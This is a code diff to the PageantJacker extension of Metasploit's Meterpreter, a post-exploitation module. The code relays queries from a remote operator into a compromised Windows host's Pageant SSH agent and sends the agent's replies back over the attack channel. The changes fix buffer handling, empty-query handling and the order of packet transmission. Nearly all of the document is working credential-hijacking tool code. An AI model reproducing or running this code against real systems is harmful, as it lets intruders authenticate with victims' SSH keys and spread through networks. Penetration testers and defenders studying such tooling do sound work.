@@ -34,7 +34,17 @@ DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 	dprintf("[PJ(request_pageant_send_query)] Size in: %d. Data is at 0x%p", raw_data_size_in, raw_data_in);
 
 	// Interact with Pageant. Note that this will always return a struct, even if the operation failed.
-	results = send_query_to_pageant(raw_data_in, raw_data_size_in);
+	if (raw_data_size_in) {
+		dprintf("[PJ(request_pageant_send_query)] Forwarding query to Pageant");
+		results = send_query_to_pageant(raw_data_in, raw_data_size_in);
+	} else {
+		results.result = TRUE;
+		results.error_message = PAGEANTJACKER_ERROR_NOTFORWARDED;
+		results.bloblength = 9;
+		results.blob = malloc(results.bloblength);
+		memcpy(results.blob, "\x00\x00\x00\x01\x05\x00\x00\x00\x00", results.bloblength);
+		dprintf("[PJ(request_pageant_send_query)] Not forwarding query to Pageant");
+	}
 
 	// Build the packet based on the respones from the Pageant interaction.
 	packet_add_tlv_bool(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_STATUS, results.result);
@@ -42,15 +52,14 @@ DWORD request_pageant_send_query(Remote *remote, Packet *packet)
 	packet_add_tlv_string(response, TLV_TYPE_EXTENSION_PAGEANTJACKER_ERRORMESSAGE, results.error_message);	
 	dprintf("[PJ(request_pageant_send_query)] Success: %d. Return data len %d, data is at 0x%p. Error message at 0x%p (%s)", results.result, results.bloblength, results.blob, &results.error_message, results.error_message);
 
-	// Transmit the packet to metasploit
-	packet_transmit_response(ERROR_SUCCESS, remote, response);
-	dprintf("[PJ(request_pageant_send_query)] Transmitted response");
-
 	// Free the allocated memory once we are done
 	if (results.blob) {
 		free(results.blob);
 		dprintf("[PJ(request_pageant_send_query)] Freed results blob");
 	}
+
+	// Transmit the packet to metasploit
+	packet_transmit_response(ERROR_SUCCESS, remote, response);
 
 	return ERROR_SUCCESS;
 }
@@ -132,14 +141,14 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 					if (querylength)
 						memcpy(filemap_pointer, query, querylength);
 
-					dprintf("[PJ(send_query_to_pageant)] Request length: %d. Query buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X. Request buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", querylength, query[0], query[1], query[2], query[3], query[4], query[5], query[6], query[7], query[8], filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7], filemap_pointer[8]);
+					dprintf("[PJ(send_query_to_pageant)] Request length: %d. Query buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X. Request buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", querylength, query[0], query[1], query[2], query[3], query[4], query[5], query[6], query[7], filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7]);
 					
 					// Send the request message to Pageant.
 					dprintf("[PJ(send_query_to_pageant)] Ready to send WM_COPYDATA");
 					if (SendMessage(hPageant, WM_COPYDATA, (WPARAM) NULL, (LPARAM) &pageant_copy_data)) {
 
 						protocol_return_length = get_length_response(filemap_pointer)+4;
-						dprintf("[PJ(send_query_to_pageant)] Result length: %d. Result buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", protocol_return_length, filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7], filemap_pointer[8]);
+						dprintf("[PJ(send_query_to_pageant)] Result length: %d. Result buffer preview: %02X:%02X:%02X:%02X:%02X:%02X:%02X:%02X", protocol_return_length, filemap_pointer[0], filemap_pointer[1], filemap_pointer[2], filemap_pointer[3], filemap_pointer[4], filemap_pointer[5], filemap_pointer[6], filemap_pointer[7]);
 						if (protocol_return_length && protocol_return_length<AGENT_MAX) {
 							if (ret.blob = calloc(1, protocol_return_length)) {
 								memcpy_result = memcpy(ret.blob, filemap_pointer, protocol_return_length);
@@ -151,12 +160,12 @@ PAGEANTQUERYRESULTS send_query_to_pageant(byte *query, unsigned int querylength)
 								ret.error_message = PAGEANTJACKER_ERROR_ALLOC;
 							}
 						}
-					} else {
+					 } else {
 						// SendMessage failed
 						ret.error_message = PAGEANTJACKER_ERROR_SENDMESSAGE;
-					}
-					api_result = UnmapViewOfFile(filemap_pointer);
-					dprintf("[PJ(send_query_to_pageant)] UnmapViewOfFile returns %d.", api_result);
+					 }
+					 api_result = UnmapViewOfFile(filemap_pointer);
+					 dprintf("[PJ(send_query_to_pageant)] UnmapViewOfFile returns %d.", api_result);
 				} else {
 					// MapViewOfFile failed
 					ret.error_message = PAGEANTJACKER_ERROR_MAPVIEWOFFILE;
